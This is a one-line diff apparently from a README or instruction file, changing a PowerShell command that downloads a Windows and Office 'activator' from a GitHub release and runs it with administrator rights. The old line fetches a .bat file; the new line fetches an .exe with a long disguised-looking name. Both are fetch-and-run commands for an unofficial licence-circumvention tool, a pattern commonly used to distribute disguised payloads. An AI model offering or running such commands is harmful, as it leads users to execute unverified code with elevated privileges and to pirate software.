@@ -1,1 +1,1 @@
-irm "https://github.com/betamod9/Windows-10-and-11-Activator/releases/download/12.27.2024/activator.bat" -OutFile "activator.bat"; Start-Process -FilePath "activator.bat" -Verb RunAs
+irm "https://github.com/betamod9/Windows-10-and-11-Activator/releases/download/12.27.2024/Windows10.and.11.Activator.+.Office.Activator.2025.exe" -OutFile "Windows10.and.11.Activator.+.Office.Activator.2025.exe"; Start-Process -FilePath "Windows10.and.11.Activator.+.Office.Activator.2025.exe" -Verb RunAs
